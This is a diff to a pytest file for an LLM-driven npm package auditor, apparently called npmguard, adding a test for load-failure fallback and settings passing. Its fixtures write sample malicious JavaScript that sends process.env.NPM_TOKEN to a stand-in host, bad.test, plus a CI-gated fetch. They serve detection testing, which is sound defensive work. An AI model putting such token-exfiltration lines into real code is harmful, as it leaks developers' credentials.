@@ -1,10 +1,13 @@
 import json
 
+import pytest
+
 from kit_llm import ScriptedLlm
 from kit_spine import make_engine, make_session_factory
 from kit_spine.db import metadata
 from npmguard.config import Settings
-from npmguard.contract.models import EntryPoints
+from npmguard.contract.models import EntryPoints, RunError
+from npmguard.errors import AuditIncompleteError
 from npmguard.inventory import analyze_inventory
 from npmguard.llm_runtime import build_npmguard_llm
 from npmguard.phases import (
@@ -120,7 +123,7 @@ async def test_kit_schema_transport_arms_hypothesis_after_bounded_repair(tmp_pat
     (package / "index.js").write_text(
         "fetch('https://bad.test', {body: process.env.NPM_TOKEN})", encoding="utf-8"
     )
-    generator = KitHypothesisGenerator(llm)
+    generator = KitHypothesisGenerator(llm, Settings(_env_file=None))
     result = await generator.generate(
         Flag(file="index.js", lines=["1-1"], why="unexpected token exfiltration"),
         package_path=package,
@@ -169,7 +172,7 @@ async def test_semantically_invalid_hypothesis_is_repaired_inside_kit(tmp_path) 
         "if (process.env.CI) fetch('https://bad.test')", encoding="utf-8"
     )
 
-    result = await KitHypothesisGenerator(llm).generate(
+    result = await KitHypothesisGenerator(llm, Settings(_env_file=None)).generate(
         Flag(file="index.js", lines=["1-1"], why="CI-gated network call"),
         package_path=package,
         intent=PackageIntent(
@@ -183,6 +186,53 @@ async def test_semantically_invalid_hypothesis_is_repaired_inside_kit(tmp_path) 
 
     assert [call.tool for call in result.experiment] == ["trigger"]
     assert provider._calls == 2
+    await llm.aclose()
+    await engine.dispose()
+
+
+async def test_one_shot_load_failure_reports_incomplete_for_fallover(tmp_path, monkeypatch) -> None:
+    """The one-shot decode compiles but the payload does not load; generate raises
+    AuditIncompleteError so the FallbackHypothesisGenerator hands off to the agentic
+    generator (which repairs)."""
+    engine = make_engine(f"sqlite+aiosqlite:///{tmp_path / 'load.sqlite3'}")
+    async with engine.begin() as connection:
+        await connection.run_sync(metadata.create_all)
+    sessions = make_session_factory(engine)
+    provider = ScriptedLlm(
+        {
+            "hypothesis": [
+                json.dumps(
+                    {
+                        "description": "invoke the flagged export",
+                        "claim": {"kind": "env_exfil", "gating": None},
+                        "severity": "medium",
+                        "setup": {
+                            "environment": [], "files": [], "dateIso": None,
+                            "urlStubs": [], "filePatches": [], "preloadCode": None,
+                        },
+                        "triggerTarget": "require('src/x.js')",  # bare specifier -> won't load
+                    }
+                )
+            ]
+        }
+    )
+    llm = build_npmguard_llm(sessions, Settings(_env_file=None), provider=provider)
+    package = tmp_path / "package"
+    package.mkdir()
+    (package / "index.js").write_text("exports.run = () => {}", encoding="utf-8")
+
+    async def _load_fails(*_args, **_kwargs):
+        return RunError(kind="CrashError", detail="Cannot find module 'src/x.js'")
+
+    monkeypatch.setattr("npmguard.phases.dry_run_load", _load_fails)  # override conftest no-op
+    with pytest.raises(AuditIncompleteError, match="did not load"):
+        await KitHypothesisGenerator(llm, Settings(_env_file=None)).generate(
+            Flag(file="index.js", lines=["1-1"], why="suspicious export"),
+            package_path=package,
+            intent=PackageIntent(statedPurpose="library", expectedCapabilities=[], rationale="m"),
+            entry_points=EntryPoints(install=[], runtime=["index.js"], bin=[]),
+            hypothesis_id="hyp-0001", created_at="t", audit_id="a",
+        )
     await llm.aclose()
     await engine.dispose()
 
@@ -240,7 +290,7 @@ async def test_custom_hypothesis_driver_is_planted_and_triggered(tmp_path) -> No
     package.mkdir()
     (package / "index.js").write_text("exports.run = () => {}", encoding="utf-8")
 
-    result = await KitHypothesisGenerator(llm).generate(
+    result = await KitHypothesisGenerator(llm, Settings(_env_file=None)).generate(
         Flag(file="index.js", lines=["1-1"], why="suspicious export"),
         package_path=package,
         intent=PackageIntent(statedPurpose="library", expectedCapabilities=[], rationale="manifest"),
